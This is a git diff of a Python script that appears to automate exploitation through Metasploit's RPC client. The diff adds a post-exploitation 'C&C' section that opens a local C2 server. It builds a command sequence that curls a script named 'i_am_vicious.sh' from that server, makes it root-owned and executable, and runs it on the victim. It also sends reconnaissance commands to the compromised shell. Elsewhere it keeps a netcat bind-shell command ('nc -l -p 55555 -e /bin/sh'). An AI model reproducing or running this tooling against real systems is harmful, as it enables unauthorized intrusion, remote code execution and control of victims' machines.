@@ -7,6 +7,7 @@ import autopayload
 from pymetasploit3.msfrpc import MsfRpcClient
 import time
 from logs import LOG
+import post.postexploit as postexploit
 
 PROMPT = "pwnguin@victim~ "
 
@@ -93,34 +94,6 @@ else:
     print("[X] Error 2 : Parsing error.")
     exit(-2)
 LOG("Parsed ./exploit_list",logfile,"log")
-
-# pprint.pprint(result[0]['RESULTS_EXPLOIT'][0]['Title'])
-
-# if result:
-#     titles=[]
-#     for i in range(len(result)):
-#         pwn = result[i]['RESULTS_EXPLOIT']
-#         for k in range(len(pwn)):
-#             titles.append(pwn[k]['Title'])
-# else:
-#     LOG("Error 2 : Parsing error.",logfile,"err")
-#     print("[X] Error 2 : Parsing error.")
-#     exit(-2)
-# LOG("Parsed ./exploit_list",logfile,"log")
-
-
-# if result:
-#     titles = []
-#     for i in range(len(result)):
-#         for k, pwn in enumerate(result):
-#             pprint.pprint(pwn['RESULTS_EXPLOIT'][k]['Title'])
-#             titles.append([k, pwn['RESULTS_EXPLOIT'][k]['Title']])
-# else:
-#     LOG("Error 2 : Parsing error.",logfile,"err")
-#     print("[X] Error 2 : Parsing error.")
-#     exit(-2)
-# LOG("Parsed ./exploit_list",logfile,"log")
-
 
 print("[~] Possible exploits :")
 if titles:
@@ -212,16 +185,48 @@ LOG("Entered in C&C section",logfile,"inf")
 #            "touch pwnguin",
 #            "nc -l -p 55555 -e /bin/sh"]
 
+
+print("[~] Opening local C2 server ...")
+
+(proc,port) = postexploit.openCtrlSrv("192.168.1.86")
+ipport = "http://192.168.1.86:"+str(port)
+
+sequence = ['curl '+ipport+"/post/i_am_vicious.sh -o mignon.sh",
+            'chown root:root mignon.sh',
+            'chmod +x mignon.sh',
+            './mignon.sh']
+
 if shell:
-    print(PROMPT + "whoami")
-    shell.write("whoami")
-    print(PROMPT + shell.read())
-    print(PROMPT + "touch pwnguin")
-    shell.write("touch pwnguin")
+    shell.write("pwd")
+    time.sleep(3)
     print(shell.read())
-    print(PROMPT + "nc -l -p 55555 -e /bin/sh")
-    shell.write("nc -l -p 55555 -e /bin/sh")
-    print("\n")
+    shell.write("whoami")
+    time.sleep(3)
+    print(shell.read())
+    shell.write("ifconfig")
+    time.sleep(6)
+    test = shell.read()
+    print(type(test))
+    print(test)
+    #print(shell.read())
+    # time.sleep(6)
+    # shell.write(sequence[1])
+    # time.sleep(6)
+    # shell.write(sequence[2])
+    # time.sleep(6)
+    # print(shell.read())
+    # shell.write(sequence[3])
+    # time.sleep(6)
+    # print(shell.read())
+    # print(PROMPT + "whoami")
+    # shell.write("whoami")
+    # print(PROMPT + shell.read())
+    # print(PROMPT + "touch pwnguin")
+    # shell.write("touch pwnguin")
+    # print(shell.read())
+    # print(PROMPT + "nc -l -p 55555 -e /bin/sh")
+    # shell.write("nc -l -p 55555 -e /bin/sh")
+    # print("\n")
 else:
     LOG("Error 4 : Could not get a shell.",logfile,"err")
     print("[X] Error 4 : Could not get a shell.")
